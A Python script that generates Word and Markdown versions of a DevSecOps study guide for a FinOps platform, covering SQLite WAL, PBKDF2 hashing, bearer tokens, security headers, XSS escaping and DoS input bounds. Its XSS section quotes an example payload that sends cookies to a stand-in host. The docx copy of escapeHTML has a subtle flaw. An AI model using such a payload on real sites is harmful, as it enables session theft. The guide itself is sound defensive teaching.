import os
import sys
from pathlib import Path
from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT, WD_ALIGN_VERTICAL
from docx.oxml import parse_xml, OxmlElement
from docx.oxml.ns import nsdecls, qn

DESKTOP_DIR = Path(r"E:\C Clearance\Desktop\Abhi_Cloud_Tech_Security_Guide")
DESKTOP_DIR.mkdir(parents=True, exist_ok=True)

DOCX_PATH = DESKTOP_DIR / "Abhi_Cloud_Tech_DevSecOps_Security_Master_Guide.docx"
MD_PATH = DESKTOP_DIR / "Abhi_Cloud_Tech_DevSecOps_Security_Master_Guide.md"

def set_cell_background(cell, fill_hex):
    tcPr = cell._tc.get_or_add_tcPr()
    tcPr.append(parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill_hex}"/>'))

def set_cell_margins(cell, top=120, bottom=120, left=150, right=150):
    tcPr = cell._tc.get_or_add_tcPr()
    tcMar = OxmlElement('w:tcMar')
    for m, val in [('top', top), ('bottom', bottom), ('left', left), ('right', right)]:
        node = OxmlElement(f'w:{m}')
        node.set(qn('w:w'), str(val))
        node.set(qn('w:type'), 'dxa')
        tcMar.append(node)
    tcPr.append(tcMar)

def create_docx():
    doc = Document()
    
    for section in doc.sections:
        section.top_margin = Inches(1)
        section.bottom_margin = Inches(1)
        section.left_margin = Inches(1)
        section.right_margin = Inches(1)
        
    normal_style = doc.styles['Normal']
    normal_style.font.name = 'Calibri'
    normal_style.font.size = Pt(11)
    normal_style.font.color.rgb = RGBColor(30, 41, 59) # Slate 800

    c_navy = RGBColor(15, 23, 42)
    c_blue = RGBColor(2, 132, 199)
    c_slate = RGBColor(71, 85, 105)

    # Title
    p_pre = doc.add_paragraph()
    p_pre.paragraph_format.space_before = Pt(10)
    p_pre.paragraph_format.space_after = Pt(2)
    r_pre = p_pre.add_run("ABHI CLOUD TECH • TECHNICAL SECURITY KNOWLEDGE BASE")
    r_pre.font.size = Pt(10)
    r_pre.font.bold = True
    r_pre.font.color.rgb = c_blue

    p_title = doc.add_paragraph()
    p_title.paragraph_format.space_before = Pt(0)
    p_title.paragraph_format.space_after = Pt(8)
    r_title = p_title.add_run("DevSecOps & Application Security Master Learning Guide")
    r_title.font.size = Pt(22)
    r_title.font.bold = True
    r_title.font.color.rgb = c_navy

    p_sub = doc.add_paragraph()
    p_sub.paragraph_format.space_after = Pt(16)
    r_sub = p_sub.add_run("A Complete Topic-by-Topic Guide to Database PRAGMAs, Cryptographic Authentication, HTTP Hardening, and Defense-in-Depth Architecture\nAuthor: Abhishek • Organization: Abhi Cloud Tech")
    r_sub.font.italic = True
    r_sub.font.color.rgb = c_slate

    # Helper function for topic headings
    def add_topic_header(title, topic_num):
        h = doc.add_heading(f"Topic {topic_num}: {title}", level=1)
        h.style.font.color.rgb = c_navy
        h.paragraph_format.space_before = Pt(16)
        h.paragraph_format.space_after = Pt(6)

    # ------------------ TOPIC 1 ------------------
    add_topic_header("Understanding DevSecOps & Shift-Left Security", 1)
    doc.add_paragraph(
        "In traditional software development, software followed the DevOps model (Development + Operations). Developers focused on shipping features rapidly, while Operations focused on deploying and running servers. Security was treated as an afterthought—audited right before release by an external security team. This led to last-minute code rewrites, delayed launches, and critical vulnerabilities escaping into production.\n\n"
        "DevSecOps (Development + Security + Operations) introduces 'Shift-Left Security'. Security is shifted left on the timeline so that security controls are engineered into the database, API routes, authentication workflows, and frontend templates from day one.\n\n"
        "In the Abhi Cloud Tech FinOps platform, DevSecOps is implemented across four distinct tiers:\n"
        "1. Database Layer: Cryptographic hashing and concurrent non-blocking storage.\n"
        "2. API Gateway: Bearer token session enforcement and DoS input boundary clamps.\n"
        "3. Web Client Layer: HTTP defensive headers and client-side HTML entity escaping.\n"
        "4. Continuous Verification: Automated test suites (60 Black-Box and 26 White-Box tests) verifying every security assertion before any release."
    )

    # ------------------ TOPIC 2 ------------------
    add_topic_header("What is SQLite PRAGMA? (WAL Mode & Concurrency)", 2)
    doc.add_paragraph(
        "Many engineers find the word 'PRAGMA' unfamiliar because it does not appear in standard SQL queries like SELECT, INSERT, or UPDATE. \n\n"
        "Analogy: Think of PRAGMA as the internal 'Settings Menu' or 'Tuning Knobs' of the database engine itself. It instructs the database how to manage memory, lock files, and synchronize data with the physical disk.\n\n"
        "In our project (src/database.py), SQLite is configured using two production PRAGMAs:"
    )

    p_p1 = doc.add_paragraph()
    r_p1_title = p_p1.add_run("1. PRAGMA journal_mode = WAL; (Write-Ahead Logging)\n")
    r_p1_title.bold = True
    r_p1_title.font.color.rgb = c_blue
    p_p1.add_run(
        "• Problem without WAL: In default SQLite mode, whenever data is inserted or updated, SQLite places an exclusive lock on the entire database file. If an API request attempts to read spend trends at the exact same moment, it crashes with 'OperationalError: database is locked'.\n"
        "• The WAL Solution: In WAL mode, SQLite leaves the main database file untouched and appends new changes to a companion file called the Write-Ahead Log (.wal). Readers continue reading the original file without waiting, while writers write concurrently.\n"
        "• Outcome: Readers never block writers, and writers never block readers. The FastAPI dashboard can serve hundreds of concurrent user requests while the billing ingestion engine seeds thousands of FOCUS records in the background."
    )

    p_p2 = doc.add_paragraph()
    r_p2_title = p_p2.add_run("2. PRAGMA synchronous = NORMAL;\n")
    r_p2_title.bold = True
    r_p2_title.font.color.rgb = c_blue
    p_p2.add_run(
        "• Function: Dictates how often SQLite commands the operating system to flush write buffers to physical storage. In WAL mode, 'NORMAL' synchronizes during checkpointing rather than on every individual commit, delivering a 3x to 5x speedup in ingestion performance while remaining completely immune to application crashes."
    )

    # ------------------ TOPIC 3 ------------------
    add_topic_header("Password Security & OWASP PBKDF2 Hashing", 3)
    doc.add_paragraph(
        "Never store plaintext passwords in a database. If an attacker gains unauthorized access to a database backup, plaintext passwords compromise user accounts across every platform where users reuse credentials.\n\n"
        "Abhi Cloud Tech implements the OWASP 2024 Gold Standard: PBKDF2-HMAC-SHA256 with 600,000 iterations and unique cryptographic salts (src/database.py)."
    )

    table_pwd = doc.add_table(rows=4, cols=2)
    table_pwd.alignment = WD_TABLE_ALIGNMENT.CENTER
    headers = ["Security Component", "Function & Real-World Mechanism"]
    for i, h in enumerate(headers):
        cell = table_pwd.cell(0, i)
        cell.paragraphs[0].text = h
        cell.paragraphs[0].runs[0].bold = True
        set_cell_background(cell, "0F172A")
        cell.paragraphs[0].runs[0].font.color.rgb = RGBColor(255, 255, 255)
        set_cell_margins(cell)

    pwd_data = [
        ("One-Way Hashing", "A mathematical algorithm that transforms an input string into a fixed-length string that cannot be reversed. You cannot 'decrypt' a hash; authentication works by hashing the entered password and comparing the results."),
        ("Cryptographic Salt (16 Bytes)", "A randomly generated 16-byte sequence added to each password before hashing. If two users choose 'password123', their stored hashes are completely different. This renders pre-computed 'Rainbow Table' attacks useless."),
        ("600,000 Iterations (Key Stretching)", "Modern GPUs can guess billions of simple hashes per second. PBKDF2 loops the HMAC-SHA256 calculation 600,000 times. This requires only 20ms for a single user login, but forces an attacker to spend centuries attempting to brute-force a dictionary of passwords.")
    ]
    for row_idx, (col1, col2) in enumerate(pwd_data, start=1):
        c1 = table_pwd.cell(row_idx, 0)
        c2 = table_pwd.cell(row_idx, 1)
        c1.paragraphs[0].text = col1
        c1.paragraphs[0].runs[0].bold = True
        c2.paragraphs[0].text = col2
        bg = "F8FAFC" if row_idx % 2 == 1 else "FFFFFF"
        set_cell_background(c1, bg)
        set_cell_background(c2, bg)
        set_cell_margins(c1)
        set_cell_margins(c2)

    # ------------------ TOPIC 4 ------------------
    doc.add_paragraph().paragraph_format.space_after = Pt(6)
    add_topic_header("Bearer Tokens & IAM Session Lifecycle", 4)
    doc.add_paragraph(
        "Analogy: Think of a Bearer Token as an electronic VIP wristband at a conference. When you register at the front desk with your ID (login with username/password), the desk gives you a wristband (Bearer Token). When entering workshop rooms or VIP lounges (calling /api/kpis or /api/forecast), the guards simply check your wristband rather than asking for your passport every time.\n\n"
        "How it operates in Abhi Cloud Tech (backend/main.py):\n"
        "1. Login: Client sends POST /api/auth/login. Server verifies credentials via PBKDF2, generates a 32-byte cryptographically secure random token (secrets.token_hex(32)), stores it in active sessions with an 8-hour timestamp, and returns it to the client.\n"
        "2. Authorization Header: For all subsequent requests, the browser sends the token via the HTTP header:\n"
        "   Authorization: Bearer <token_string>\n"
        "3. Gatekeeping: If the header is missing, malformed, or expired, FastAPI rejects the request with HTTP 401 Unauthorized.\n"
        "4. Revocation: Calling POST /api/auth/logout immediately invalidates the token on the server, ensuring discarded sessions cannot be hijacked."
    )

    # ------------------ TOPIC 5 ------------------
    add_topic_header("Browser Security & HTTP Security Headers", 5)
    doc.add_paragraph(
        "Even when an API is secure, web browsers can be tricked by malicious websites. In backend/main.py, our custom SecurityHeadersMiddleware injects five standard defensive headers into every HTTP response:"
    )

    table_hdr = doc.add_table(rows=6, cols=3)
    table_hdr.alignment = WD_TABLE_ALIGNMENT.CENTER
    hdr_titles = ["HTTP Header", "Threat Prevented", "How It Protects Users"]
    for i, h in enumerate(hdr_titles):
        cell = table_hdr.cell(0, i)
        cell.paragraphs[0].text = h
        cell.paragraphs[0].runs[0].bold = True
        set_cell_background(cell, "0F172A")
        cell.paragraphs[0].runs[0].font.color.rgb = RGBColor(255, 255, 255)
        set_cell_margins(cell)

    hdr_data = [
        ("Content-Security-Policy (CSP)", "Cross-Site Scripting (XSS)", "Strict whitelist declaring that scripts and styles may only load from self and trusted CDNs (Tailwind, unpkg). Blocks external script injections."),
        ("X-Frame-Options: DENY", "Clickjacking", "Forbids other websites from rendering the FinOps application inside an invisible <iframe>, preventing malicious overlays from hijacking user clicks."),
        ("X-Content-Type-Options: nosniff", "MIME-Type Sniffing", "Forces browsers to strictly obey declared MIME types. Stops attackers from disguising executable JavaScript as an innocent image file."),
        ("X-XSS-Protection: 1; mode=block", "Reflected XSS", "Instructs legacy browsers to halt rendering immediately if an input-reflection script injection attack is detected in the URL."),
        ("Referrer-Policy: strict-origin", "Information Leakage", "Guarantees that sensitive internal URLs, parameters, and tokens are stripped whenever navigating to external resources.")
    ]
    for row_idx, (col1, col2, col3) in enumerate(hdr_data, start=1):
        c1 = table_hdr.cell(row_idx, 0)
        c2 = table_hdr.cell(row_idx, 1)
        c3 = table_hdr.cell(row_idx, 2)
        c1.paragraphs[0].text = col1
        c1.paragraphs[0].runs[0].bold = True
        c2.paragraphs[0].text = col2
        c3.paragraphs[0].text = col3
        bg = "F8FAFC" if row_idx % 2 == 1 else "FFFFFF"
        set_cell_background(c1, bg)
        set_cell_background(c2, bg)
        set_cell_background(c3, bg)
        set_cell_margins(c1)
        set_cell_margins(c2)
        set_cell_margins(c3)

    # ------------------ TOPIC 6 ------------------
    doc.add_paragraph().paragraph_format.space_after = Pt(6)
    add_topic_header("Client-Side XSS Mitigation: Entity Escaping", 6)
    doc.add_paragraph(
        "Cross-Site Scripting (XSS) occurs when malicious code is injected into dynamic web interfaces. If an attacker names a cloud resource '<script>fetch(\"evil.com?c=\"+document.cookie)</script>', an unprotected frontend will execute that script in the administrator's browser.\n\n"
        "In backend/static/index.html, every single dynamic value passes through the escapeHTML() sanitization utility:\n"
        "  function escapeHTML(str) {\n"
        "      return str.replace(/[&<>'\"/]/g, tag => ({\n"
        "          '&': '&amp;', '<': '&lt;', '>': '&gt;',\n"
        "          \"'\": '&#39;', '\"': '&quot;'\n"
        "      }[tag]));\n"
        "  }\n\n"
        "This converts dangerous HTML characters into harmless display entities, ensuring that resource names, anomaly diagnoses, and scenario tags are rendered as plain text rather than executable scripts."
    )

    # ------------------ TOPIC 7 ------------------
    add_topic_header("Anti-DoS Protection & ML Resource Bounding", 7)
    doc.add_paragraph(
        "Machine Learning algorithms (such as our HistGradientBoosting multi-quantile forecaster) consume CPU cycles and memory proportional to the size of the prediction horizon.\n\n"
        "• The Threat: A malicious user or script requests a forecast with horizon_days = 999999999. The server allocates gigabytes of RAM to generate lag features for millions of future days, exhausting system memory and crashing the entire platform.\n"
        "• The DevSecOps Defense: Using Pydantic data schemas in backend/main.py, input bounds are enforced at the API boundary:\n"
        "  horizon_days: int = Field(default=60, ge=1, le=180)\n\n"
        "Any request with horizon_days < 1 or horizon_days > 180 is immediately rejected with HTTP 422 Unprocessable Entity in under 15 milliseconds, protecting backend ML worker threads from resource exhaustion."
    )

    # ------------------ TOPIC 8 ------------------
    add_topic_header("Automated Security Verification & Test Suites", 8)
    doc.add_paragraph(
        "Security is only as good as its automated verification. Abhi Cloud Tech maintains two automated test suites:\n\n"
        "1. Black-Box Security & API Test Suite (scripts/test_blackbox_api.py):\n"
        "   • 60 / 60 Tests Passed (100% Pass Rate).\n"
        "   • Verifies that unauthenticated calls to /api/kpis, /api/forecast, and /api/warehouse return HTTP 401.\n"
        "   • Verifies that tampering with Bearer tokens results in immediate rejection.\n"
        "   • Verifies all 5 HTTP security headers on all responses.\n"
        "   • Tests DoS boundary rejections on negative and excessive horizon values.\n\n"
        "2. White-Box FinOps Test Suite (tests/test_whitebox_finops.py):\n"
        "   • 26 / 26 Tests Passed (100% Pass Rate).\n"
        "   • Verifies quantile monotonicity invariant (Lower <= Median <= Upper) across all forecasts.\n"
        "   • Verifies SQLite WAL database connection concurrency and data integrity."
    )

    # ------------------ TOPIC 9 ------------------
    add_topic_header("Technical Viva Q&A & Interview Defense Cheat-Sheet", 9)
    doc.add_paragraph("Master the following answers to present and defend your security architecture with confidence:")

    qa_items = [
        ("Q1: What does 'Shift-Left' mean in DevSecOps?",
         "A1: It means integrating security checks into the earliest stages of the software development lifecycle (database schema, API routing, input validation) rather than testing security only at the very end before deployment."),

        ("Q2: Why did you use SQLite PRAGMA journal_mode=WAL?",
         "A2: Default SQLite locks the entire database on writes, causing concurrent reads to fail. WAL (Write-Ahead Logging) mode decouples writes into a separate log file, allowing non-blocking concurrent reads and writes so the dashboard stays fast while data ingests."),

        ("Q3: Why 600,000 iterations for PBKDF2 password hashing?",
         "A3: 600,000 iterations is the official OWASP recommendation. It introduces enough computational stretching to defeat GPU brute-force attacks while taking only ~20 milliseconds for a legitimate user login."),

        ("Q4: How does your architecture protect against Denial-of-Service on ML models?",
         "A4: We use strict Pydantic Field boundaries (ge=1, le=180) on forecast horizons. Any payload asking for an excessive forecast range is rejected with HTTP 422 before the ML models are invoked."),

        ("Q5: What is Content-Security-Policy (CSP)?",
         "A5: CSP is an HTTP response header that restricts which domains the browser can execute scripts or load stylesheets from. It prevents Cross-Site Scripting (XSS) by blocking untrusted external scripts.")
    ]

    for q, a in qa_items:
        pq = doc.add_paragraph()
        pq.paragraph_format.space_before = Pt(8)
        pq.paragraph_format.space_after = Pt(2)
        rq = pq.add_run(q)
        rq.bold = True
        rq.font.color.rgb = c_navy

        pa = doc.add_paragraph()
        pa.paragraph_format.space_before = Pt(0)
        pa.paragraph_format.space_after = Pt(8)
        pa.add_run(a)

    doc.add_paragraph("―" * 55)
    pend = doc.add_paragraph()
    pend.alignment = WD_ALIGN_PARAGRAPH.CENTER
    rend = pend.add_run("Abhi Cloud Tech • DevSecOps & Security Knowledge Base • Written for Abhishek")
    rend.font.size = Pt(9)
    rend.font.italic = True
    rend.font.color.rgb = RGBColor(148, 163, 184)

    doc.save(str(DOCX_PATH))
    print(f"Created Word Document: {DOCX_PATH}")

def create_markdown():
    content = """# Abhi Cloud Tech — DevSecOps & Security Master Learning Guide

**Author:** Abhishek  
**Organization:** Abhi Cloud Tech  
**System Classification:** Enterprise DevSecOps Architecture & Defense-in-Depth Specification  

---

## Table of Contents
1. [Topic 1: Understanding DevSecOps & Shift-Left Security](#topic-1-understanding-devsecops--shift-left-security)
2. [Topic 2: What is SQLite PRAGMA? (WAL Mode & Concurrency)](#topic-2-what-is-sqlite-pragma-wal-mode--concurrency)
3. [Topic 3: Password Security & OWASP PBKDF2 Hashing](#topic-3-password-security--owasp-pbkdf2-hashing)
4. [Topic 4: Bearer Tokens & IAM Session Lifecycle](#topic-4-bearer-tokens--iam-session-lifecycle)
5. [Topic 5: Browser Security & HTTP Security Headers](#topic-5-browser-security--http-security-headers)
6. [Topic 6: Client-Side XSS Mitigation: Entity Escaping](#topic-6-client-side-xss-mitigation-entity-escaping)
7. [Topic 7: Anti-DoS Protection & ML Resource Bounding](#topic-7-anti-dos-protection--ml-resource-bounding)
8. [Topic 8: Automated Security Verification & Test Suites](#topic-8-automated-security-verification--test-suites)
9. [Topic 9: Technical Viva Q&A & Interview Defense Cheat-Sheet](#topic-9-technical-viva-qa--interview-defense-cheat-sheet)

---

## Topic 1: Understanding DevSecOps & Shift-Left Security

In traditional software development, organizations followed the **DevOps** model (Development + Operations). Developers focused on shipping features rapidly, while Operations focused on deploying and running servers. Security was treated as an afterthought—audited right before release by an external security team. This led to last-minute code rewrites, delayed launches, and critical vulnerabilities escaping into production.

**DevSecOps (Development + Security + Operations)** introduces **"Shift-Left Security"**. Security is shifted left on the project timeline so that security controls are engineered into the database, API routes, authentication workflows, and frontend templates from day one.

In the **Abhi Cloud Tech FinOps Platform**, DevSecOps is implemented across four distinct tiers:
1. **Database Layer**: Cryptographic hashing and concurrent non-blocking storage.
2. **API Gateway**: Bearer token session enforcement and DoS input boundary clamps.
3. **Web Client Layer**: HTTP defensive headers and client-side HTML entity escaping.
4. **Continuous Verification**: Automated test suites (60 Black-Box and 26 White-Box tests) verifying every security assertion before any release.

---

## Topic 2: What is SQLite PRAGMA? (WAL Mode & Concurrency)

Many engineers find the word **PRAGMA** unfamiliar because it does not appear in standard SQL queries like `SELECT`, `INSERT`, or `UPDATE`.

> **Analogy**: Think of `PRAGMA` as the internal **"Settings Menu" or "Tuning Knobs"** of the database engine itself. It instructs SQLite how to manage memory, lock files, and synchronize data with the physical disk.

In our project (`src/database.py`), SQLite is configured using two production PRAGMAs:

### 1. `PRAGMA journal_mode = WAL;` (Write-Ahead Logging)
* **Problem without WAL**: In default SQLite mode, whenever data is inserted or updated, SQLite places an exclusive lock on the entire database file. If an API request attempts to read spend trends at the exact same moment, it crashes with `OperationalError: database is locked`.
* **The WAL Solution**: In WAL mode, SQLite leaves the main database file untouched and appends new changes to a companion file called the Write-Ahead Log (`.wal`). Readers continue reading the original file without waiting, while writers write concurrently.
* **Outcome**: **Readers never block writers, and writers never block readers**. The FastAPI dashboard can serve hundreds of concurrent user requests while the billing ingestion engine seeds thousands of FOCUS records in the background.

### 2. `PRAGMA synchronous = NORMAL;`
* **Function**: Dictates how often SQLite commands the operating system to flush write buffers to physical storage. In WAL mode, `NORMAL` synchronizes during checkpointing rather than on every individual commit, delivering a **3x to 5x speedup in ingestion performance** while remaining completely immune to application crashes.

---

## Topic 3: Password Security & OWASP PBKDF2 Hashing

Never store plaintext passwords in a database. If an attacker gains unauthorized access to a database backup, plaintext passwords compromise user accounts across every platform where users reuse credentials.

Abhi Cloud Tech implements the **OWASP 2024 Gold Standard: PBKDF2-HMAC-SHA256 with 600,000 iterations and unique cryptographic salts** (`src/database.py`).

```
Plaintext Password: "password123"
        ↓
1. Cryptographic Salt (16 random bytes: e.g. 9a4f2b...)
        ↓
2. HMAC-SHA256 Hashing Algorithm
        ↓
3. 600,000 Stretching Iterations (OWASP Standard)
        ↓
Stored Hash: "$pbkdf2-sha256$600000$9a4f2b...$8c2e..."
```

| Security Component | Function & Real-World Mechanism |
| :--- | :--- |
| **One-Way Hashing** | A mathematical algorithm that transforms an input string into a fixed-length string that cannot be reversed. You cannot "decrypt" a hash; authentication works by hashing the entered password and comparing the results. |
| **Cryptographic Salt (16 Bytes)** | A randomly generated 16-byte sequence added to each password before hashing. If two users choose `password123`, their stored hashes are completely different. This renders pre-computed "Rainbow Table" attacks useless. |
| **600,000 Iterations (Key Stretching)** | Modern GPUs can guess billions of simple hashes per second. PBKDF2 loops the HMAC-SHA256 calculation 600,000 times. This requires only 20ms for a single user login, but forces an attacker to spend centuries attempting to brute-force a dictionary of passwords. |

---

## Topic 4: Bearer Tokens & IAM Session Lifecycle

> **Analogy**: Think of a Bearer Token as an electronic **VIP wristband at a conference**. When you register at the front desk with your ID (login with username/password), the desk gives you a wristband (Bearer Token). When entering workshop rooms or VIP lounges (calling `/api/kpis` or `/api/forecast`), the guards simply check your wristband rather than asking for your passport every time.

### How it operates in Abhi Cloud Tech (`backend/main.py`):
1. **Login**: Client sends `POST /api/auth/login`. Server verifies credentials via PBKDF2, generates a 32-byte cryptographically secure random token (`secrets.token_hex(32)`), stores it in active sessions with an 8-hour timestamp, and returns it to the client.
2. **Authorization Header**: For all subsequent requests, the browser sends the token via the HTTP header:
   ```http
   Authorization: Bearer <token_string>
   ```
3. **Gatekeeping**: If the header is missing, malformed, or expired, FastAPI rejects the request with **`HTTP 401 Unauthorized`**.
4. **Revocation**: Calling `POST /api/auth/logout` immediately invalidates the token on the server, ensuring discarded sessions cannot be hijacked.

---

## Topic 5: Browser Security & HTTP Security Headers

Even when an API is secure, web browsers can be tricked by malicious websites. In `backend/main.py`, our custom `SecurityHeadersMiddleware` injects five standard defensive headers into every HTTP response:

| HTTP Header | Threat Prevented | How It Protects Users |
| :--- | :--- | :--- |
| **`Content-Security-Policy (CSP)`** | **Cross-Site Scripting (XSS)** | Strict whitelist declaring that scripts and styles may only load from `self` and trusted CDNs (Tailwind, unpkg). Blocks external script injections. |
| **`X-Frame-Options: DENY`** | **Clickjacking** | Forbids other websites from rendering the FinOps application inside an invisible `<iframe>`, preventing malicious overlays from hijacking user clicks. |
| **`X-Content-Type-Options: nosniff`** | **MIME-Type Sniffing** | Forces browsers to strictly obey declared MIME types. Stops attackers from disguising executable JavaScript as an innocent image file. |
| **`X-XSS-Protection: 1; mode=block`** | **Reflected XSS** | Instructs legacy browsers to halt rendering immediately if an input-reflection script injection attack is detected in the URL. |
| **`Referrer-Policy: strict-origin`** | **Information Leakage** | Guarantees that sensitive internal URLs, parameters, and tokens are stripped whenever navigating to external resources. |

---

## Topic 6: Client-Side XSS Mitigation: Entity Escaping

Cross-Site Scripting (XSS) occurs when malicious code is injected into dynamic web interfaces. If an attacker names a cloud resource `<script>fetch("evil.com?c="+document.cookie)</script>`, an unprotected frontend will execute that script in the administrator's browser.

In `backend/static/index.html`, every single dynamic value passes through the `escapeHTML()` sanitization utility:

```javascript
function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, tag => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        "'": '&#39;', '"': '&quot;'
    }[tag]));
}
```

This converts dangerous HTML characters into harmless display entities, ensuring that resource names, anomaly diagnoses, and scenario tags are rendered as plain text rather than executable scripts.

---

## Topic 7: Anti-DoS Protection & ML Resource Bounding

Machine Learning algorithms (such as our `HistGradientBoosting` multi-quantile forecaster) consume CPU cycles and memory proportional to the size of the prediction horizon.

* **The Threat**: A malicious user or script requests a forecast with `horizon_days = 999999999`. The server allocates gigabytes of RAM to generate lag features for millions of future days, exhausting system memory and crashing the entire platform.
* **The DevSecOps Defense**: Using Pydantic data schemas in `backend/main.py`, input bounds are enforced at the API boundary:
  ```python
  horizon_days: int = Field(default=60, ge=1, le=180)
  ```
  Any request with `horizon_days < 1` or `horizon_days > 180` is immediately rejected with **`HTTP 422 Unprocessable Entity`** in under 15 milliseconds, protecting backend ML worker threads from resource exhaustion.

---

## Topic 8: Automated Security Verification & Test Suites

Security is only as good as its automated verification. Abhi Cloud Tech maintains two automated test suites:

1. **Black-Box Security & API Test Suite (`scripts/test_blackbox_api.py`)**:
   * **60 / 60 Tests Passed (100% Pass Rate)**.
   * Verifies that unauthenticated calls to `/api/kpis`, `/api/forecast`, and `/api/warehouse` return `HTTP 401`.
   * Verifies that tampering with Bearer tokens results in immediate rejection.
   * Verifies all 5 HTTP security headers on all responses.
   * Tests DoS boundary rejections on negative and excessive horizon values.

2. **White-Box FinOps Test Suite (`tests/test_whitebox_finops.py`)**:
   * **26 / 26 Tests Passed (100% Pass Rate)**.
   * Verifies quantile monotonicity invariant ($Q_{05} \le Q_{50} \le Q_{95}$) across all forecasts.
   * Verifies SQLite WAL database connection concurrency and data integrity.

---

## Topic 9: Technical Viva Q&A & Interview Defense Cheat-Sheet

Master the following answers to present and defend your security architecture with confidence:

### Q1: What does "Shift-Left" mean in DevSecOps?
> **Answer**: It means integrating security checks into the earliest stages of the software development lifecycle (database schema, API routing, input validation) rather than testing security only at the very end before deployment.

### Q2: Why did you use SQLite PRAGMA journal_mode=WAL?
> **Answer**: Default SQLite locks the entire database on writes, causing concurrent reads to fail. WAL (Write-Ahead Logging) mode decouples writes into a separate log file, allowing non-blocking concurrent reads and writes so the dashboard stays fast while data ingests.

### Q3: Why 600,000 iterations for PBKDF2 password hashing?
> **Answer**: 600,000 iterations is the official OWASP recommendation. It introduces enough computational stretching to defeat GPU brute-force attacks while taking only ~20 milliseconds for a legitimate user login.

### Q4: How does your architecture protect against Denial-of-Service on ML models?
> **Answer**: We use strict Pydantic Field boundaries (`ge=1, le=180`) on forecast horizons. Any payload asking for an excessive forecast range is rejected with `HTTP 422` before the ML models are invoked.

### Q5: What is Content-Security-Policy (CSP)?
> **Answer**: CSP is an HTTP response header that restricts which domains the browser can execute scripts or load stylesheets from. It prevents Cross-Site Scripting (XSS) by blocking untrusted external scripts.
"""
    with open(MD_PATH, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"Created Markdown Guide: {MD_PATH}")

if __name__ == "__main__":
    print("Building Security & DevSecOps Guide on Desktop...")
    create_docx()
    create_markdown()
    print("Desktop Guide Generation Complete!")
